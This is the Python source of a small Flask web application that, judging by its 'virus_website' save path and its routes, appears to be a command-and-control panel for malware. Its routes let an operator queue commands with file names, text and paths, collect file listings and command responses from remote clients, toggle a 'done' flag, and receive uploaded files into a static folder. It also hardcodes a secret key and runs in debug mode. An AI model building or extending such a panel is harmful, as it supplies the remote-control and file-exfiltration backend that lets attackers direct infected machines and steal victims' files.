from flask import Flask, render_template, request, url_for
from flask_wtf import FlaskForm
from wtforms import SubmitField, FileField, StringField
import os

class AnswerForm(FlaskForm):
    answer = StringField('answer')
    submit = SubmitField('Submit')

class FileForm(FlaskForm):
    file = FileField('file')
    submit = SubmitField('Submit')

current_command = ""
current_filename = ""
current_text = ""
current_path = ""
answer = ""

list = {'command':current_command, 'filename':current_filename, 'text':current_text, 'path':current_path}
files = []
done = False

app = Flask(__name__)
app.config['SECRET_KEY'] = 'hrttjtj7ty41jtjytj=tyjùtyljprkizu"tkojnrr2n0r)àyé-mhjùmn^prt^y^rt'

@app.route('/')
def main():
    return render_template("site.html", list=list, files=[])

@app.route('/response', methods=['GET', 'POST'])
def response():
    global answer
    form = AnswerForm()
    if request.method == 'POST':
        answer = form.answer.data
    return answer

@app.route('/add<command>/<filename>/<text>/<path>')
def add_command(command, filename, text, path):
    global current_command
    global current_filename
    global current_text
    global current_path
    global list

    current_command = command
    current_filename = filename
    current_text = text
    current_path = path

    list = {'command':current_command, 'filename':current_filename, 'text':current_text, 'path':current_path}

    return ""


@app.route('/files')
def all_files():
    return render_template("site.html", list=[], files=files)

@app.route('/files/<file>')
def add_file(file):
    global files
    if file == "false":
        files = []
    else:
        files.append(file)
    return ""

@app.route('/remove<command>')
def remove_command(command):
    global current_command
    global list
    current_command = ""
    current_filename = ""
    current_text = ""
    current_path = ""

    list = {'command':current_command, 'filename':current_filename, 'text':current_text, 'path':current_path}

    return ""

@app.route('/done/<signal>')
def turn(signal):
    global done
    if signal == "true":
        done = True
    else:
        done = False
    return ""

@app.route('/done')
def check():
    if done:
        return "done"
    else:
        return ""

@app.route('/upload', methods=['GET', 'POST'])
def index():
    form = FileForm()
    if request.method == 'POST':
        f = form.file.data
        f.save(os.path.join('C:\\Users\\achra\\Documents\\Documents\\python files\\Flask\\virus_website', 'static', f.filename))

    return ""

if __name__ == '__main__':
    app.run(debug=True)
